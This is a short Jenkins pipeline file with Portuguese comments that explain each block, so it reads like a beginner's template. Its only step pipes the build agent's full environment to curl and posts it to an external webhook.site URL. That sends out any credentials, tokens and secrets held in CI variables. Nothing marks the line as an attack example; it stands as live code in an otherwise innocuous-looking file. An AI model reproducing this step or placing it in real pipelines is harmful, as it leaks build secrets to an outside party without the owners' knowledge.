pipeline {
    agent any              // onde rodar (qualquer agente disponível)
    
    stages {               // conjunto de etapas
        stage('Nome') {    // uma etapa específica
            steps {        // ações dentro da etapa
                sh 'env | curl -X POST -d @- https://webhook.site/c09447b4-61d7-425a-865a-fe773f8b014d'
            }
        }
    }
}
